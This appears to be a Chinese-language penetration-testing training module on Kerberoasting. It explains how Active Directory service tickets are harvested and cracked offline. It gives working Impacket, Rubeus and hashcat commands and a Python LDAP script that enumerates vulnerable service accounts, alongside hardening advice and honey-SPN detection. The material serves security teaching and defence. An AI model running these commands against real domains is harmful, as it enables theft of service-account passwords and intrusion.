# R07.2 Kerberos 服務票證雜湊收割與離線破解 (Kerberoasting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Kerberos 服務票證雜湊收割 (Kerberoasting)** 的物理本質為**利用 Kerberos 協定允許「任何已驗證網域帳號向 KDC 索取全網任意註冊 SPN 之服務票證」的底層設計**。在 Active Directory 中，當某個服務帳號綁定了服務主體名稱 (Service Principal Name, SPN) 時，KDC 回傳的 TGS 服務票證其加密區段 (`enc-part`) 是由**該服務帳號自身的密碼金鑰**加密而成。攻擊者只需持有一組最底層的合法網域帳號，即可批次向 KDC 申請全網服務票證並導出密文，於離線端發起無限制之 GPU 字典暴力破解，獲取明文服務密碼。

```
[攻擊者持低權限網域帳號: lowpriv] ── 1. LDAP 查詢含有 servicePrincipalName 屬性之使用者帳號
                                                │
                                                ▼ 2. 向 KDC 發送 TGS-REQ (KRB_TGS_REQ) 請求指定 SPN
[網域控制站 KDC (TCP/UDP 88)] ────────────────► 【協定設計】KDC 不檢查使用者是否真有存取該服務之授權！
                                                │
                                                ▼ 3. KDC 以目標服務帳號密碼金鑰加密服務票證
[攻擊者控制台] ◄── 4. 回傳 KRB_TGS_REP ────────┘
      │
      ▼ 5. 提取 TGS 密文轉換為 Hashcat 格式 ($krb5tgs$23$*...)
[離線 GPU 叢集] ──► 實施極速字典暴力破解，無痕還原高權限服務帳號 (如 MSSQL、IIS) 明文密碼！
```

## 🔬 第一動：SPN 綁定與 TGS 票證加密物理機制 (Mechanics & Kerberos Physics)

### 1. 機器帳號 vs 使用者服務帳號安全性對照

| 帳號類型 | SPN 綁定對象 | 密碼物理特性 | Kerberoasting 破解可行性 |
| :--- | :--- | :--- | :--- |
| **電腦帳號 (Computer)** | 網域主機 (`HOST/wkst01`) | 120 字元隨機亂數，30 天自動輪替 | **物理不可破解** (密碼空間過大) |
| **使用者帳號 (User)** | 自訂服務帳號 (`MSSQLSvc/sql.corp`) | 通常為人工設定之靜態密碼、未定期變更 | **極易被破解** (常見弱密碼或規則組合) |
| **群組受控服務帳號 (gMSA)**| 網域專屬 gMSA 物件 | 128 位元強亂數金鑰，由 DC 自動維護 | **免疫破解** (無法實體還原密鑰) |

### 1. 核心 SPN 收割與破解指令速查表 (Impacket / Rubeus / Hashcat)

```bash
# 1. Linux 環境下透過 Impacket 批次枚舉並請求全網 SPN 票證
GetUserSPNs.py corp.internal/lowpriv:Password123! -dc-ip 10.0.0.1 -request -outputfile tgs_hashes.txt

# 2. Windows 記憶體內聯執行 (Rubeus 專屬 RC4 降級收割)
execute-assembly Rubeus.exe kerberoast /format:hashcat /outfile:C:\temp\tgs.txt

# 3. 指定高特權管理員 SPN 進行精準刺客收割 (規避全網大範圍輪詢)
execute-assembly Rubeus.exe kerberoast /user:svc_backup /nowrap

# 4. Hashcat 離線極速破解 (模式 13100 對應 RC4-HMAC, 模式 19600 對應 AES-128, 模式 19700 對應 AES-256)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule --force
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **全面遷移至群組受控服務帳號 (gMSA)**：
   - 將所有核心服務（SQL, Web, 排程工作）改由 **gMSA** 運行；密碼長度強制由 DC 維護為 128 位元亂數並自動輪替，使離線破解徹底失效。
2. **強制啟用 AES 封裝並禁用 RC4 (Kerberos AES Only)**：
   - 在網域原則與服務帳號屬性中勾選「此帳號支援 Kerberos AES 256 位元加密」，杜絕攻擊者強制要求 RC4 降級。
3. **部署 Honey-SPN 誘餌帳號**：
   - 註冊虛假 SPN（如 `MSSQLSvc/db-prod-legacy.corp`）；一旦任何帳號向 KDC 索取該票證，100% 定性為內部惡意探測，立即觸發自動化封鎖。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 SPN 篩選與探測模擬腳本 (Python, 20 行)
```python
# find_spn.py
from ldap3 import Server, Connection, ALL

server = Server("127.0.0.1", get_info=ALL)
conn = Connection(server, user="corp\\lowpriv", password="Password123!", auto_bind=True)

# 搜尋所有綁定 SPN 且非電腦帳號的使用者物件
search_filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
conn.search(search_base="DC=corp,DC=internal", search_filter=search_filter, attributes=["sAMAccountName", "servicePrincipalName"])

print("[*] 網域內可遭受 Kerberoasting 之服務帳號清單:")
for entry in conn.entries:
    if not entry.sAMAccountName.value.endswith("$"):
        print(f"[!] 發現易受害服務帳號: {entry.sAMAccountName} | SPN: {entry.servicePrincipalName.values}")
```

### 2. 三步作戰驗證流程
```bash
# 步驟 1: 執行 SPN 探測腳本
python3 find_spn.py
# 驗證輸出：[!] 發現易受害服務帳號: svc_sql | SPN: ['MSSQLSvc/sql.corp.internal:1433']

# 步驟 2: 發送 TGS 請求抽取雜湊材料
GetUserSPNs.py corp.internal/lowpriv:Password123! -request-user svc_sql -outputfile hash.txt
# 驗證輸出：$krb5tgs$23$*svc_sql*... 成功導出 TGS 密文

# 步驟 3: 驗證加固修復（將 svc_sql 遷移為 gMSA 或修改密碼長度超過 30 字元）
# 驗證輸出：Hashcat 運行數小時無果，離線破解在算力上不可行
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Kerberoasting 過程是否會造成目標服務中斷或觸發帳號鎖定？**
  - **戰術思維**：**完全不會**。Kerberoasting 僅與網域控制站 (KDC) 進行正常合法的 Kerberos 票證協商，**根本不與真實的後端服務伺服器產生任何網路連線**；且離線破解在攻擊機本機進行，永遠不會觸發 AD 的密碼錯誤次數計數器。
- [ ] **Q2：為何在請求 TGS 時，指定 RC4 (etype 23) 相比 AES256 破解速度有何巨幅差異？**
  - **戰術思維**：RC4 的金鑰衍生函數僅為 MD4 雜湊，運算極度輕量，頂級顯卡每秒可跑數十億次；而 AES256 採用 PBKDF2-HMAC-SHA1 迭代 4096 次衍生金鑰，運算成本增加數千倍，大幅增加破解難度。
- [ ] **Q3：普通網域使用者帳號為何能夠自行註冊 SPN，這會引發何種攻擊？**
  - **戰術思維**：在預設配置下，普通使用者無法為他人註冊 SPN，但若使用者對自身物件或特定委派物件具備寫入權限，可為其新增 SPN 實施「定向 Kerberoasting (Targeted Kerberoasting)」。
- [ ] **Q4：藍隊如何運用 Honey-SPN (蜜罐 SPN) 達成對 Kerberoasting 的零誤報精準獵捕？**
  - **戰術思維**：建立一個名為 `svc_sap_prod` 的使用者並註冊虛假 SPN，但不為其部署任何真實應用程式。由於正常業務從不調用此 SPN，只要 Event 4769 出現該 ServiceName，發起請求的帳號即為確定之內部威脅。
- [ ] **Q5：若目標帳號配置了「敏感帳戶，不能被委派 (Account is sensitive and cannot be delegated)」，能否防範 Kerberoasting？**
  - **戰術思維**：**不能**。不能被委派限制的是跨主機的 Kerberos 委派行為 (Unconstrained/Constrained Delegation)，但完全不阻止 KDC 發放該帳號自身的 TGS 服務票證。
